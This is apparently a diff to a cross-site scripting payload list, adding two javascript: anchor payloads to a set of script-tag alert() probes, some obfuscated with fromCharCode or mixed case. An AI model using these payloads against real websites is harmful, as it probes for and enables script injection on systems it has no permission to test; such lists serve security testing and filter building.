@@ -1,6 +1,9 @@
 <script>alert(123);</script>
 <script>alert("XSS");</script>
 <script>alert(String.fromCharCode(88,83,83))</script>
+<a href=javascript:alert(String.fromCharCode(88,83,83))>Click Me!</script>
+<a href=javascript:alert(&quot;XSS&quot;)>Click Me!</script>
+
 <ScRipT>alert("XSS BY ASHIK");</ScRipT>
 <script>alert(123)</script>
 <script>alert("hellox worldss");</script>
